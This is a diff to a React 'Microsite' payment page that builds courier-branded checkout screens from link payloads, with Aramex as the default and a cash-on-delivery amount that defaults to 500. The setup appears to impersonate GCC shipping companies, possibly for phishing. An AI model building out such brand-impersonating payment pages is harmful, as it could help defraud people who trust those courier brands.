@@ -46,12 +46,28 @@ const Microsite = () => {
   }
   
   const payload = link.payload;
-  
+
+  // Get amount from payload - ensure it's a number, handle all data types
+  const rawAmount = payload.cod_amount;
+
+  // Handle different data types and edge cases
+  let amount = 500; // Default value
+  if (rawAmount !== undefined && rawAmount !== null) {
+    if (typeof rawAmount === 'number') {
+      amount = rawAmount;
+    } else if (typeof rawAmount === 'string') {
+      const parsed = parseFloat(rawAmount);
+      if (!isNaN(parsed)) {
+        amount = parsed;
+      }
+    }
+  }
+
   // Get service branding for SEO and display
   const serviceName = payload.service_name || payload.chalet_name;
   const serviceKey = payload.service_key || 'aramex';
   const serviceBranding = getServiceBranding(serviceKey);
-  
+
   // Update URL to include service information for better SEO
   React.useEffect(() => {
     const currentUrl = new URL(window.location.href);
@@ -60,11 +76,9 @@ const Microsite = () => {
       window.history.replaceState({}, '', currentUrl.toString());
     }
   }, [isShipping, serviceKey]);
-  
-  // Get service description from gccShippingServices
-  const allServices = Object.values(gccShippingServices).flat();
-  const serviceData = allServices.find(s => s.key === serviceKey);
-  const serviceDescription = serviceData?.description || `خدمة ${serviceName} - نظام دفع آمن ومحمي`;
+
+  // Get service description from serviceBranding to match the chosen company
+  const serviceDescription = serviceBranding.description || `خدمة ${serviceName} - نظام دفع آمن ومحمي`;
   
   // Determine if it's a shipping or chalet link
   const isShipping = link.type === 'shipping';
@@ -181,7 +195,7 @@ const Microsite = () => {
                       <div>
                         <p className="font-semibold mb-1">مبلغ الدفع</p>
                         <p className="text-muted-foreground text-sm">
-                          {formatCurrency(payload.cod_amount, countryData.currency)}
+                          {formatCurrency(amount, countryData.currency)}
                         </p>
                       </div>
                     </div>
@@ -235,7 +249,7 @@ const Microsite = () => {
               <div className="bg-gradient-primary p-6 rounded-xl text-primary-foreground mb-6">
                 <p className="text-sm mb-2 opacity-90">المبلغ الإجمالي</p>
                 <p className="text-5xl font-bold mb-2">
-                  {formatCurrency(isShipping ? payload.cod_amount : payload.total_amount, countryData.currency)}
+                  {formatCurrency(isShipping ? amount : payload.total_amount, countryData.currency)}
                 </p>
                 <p className="text-sm opacity-80">
                   {isShipping ? 'مبلغ الدفع عند الاستلام' : `${payload.price_per_night} × ${payload.nights} ليلة`}
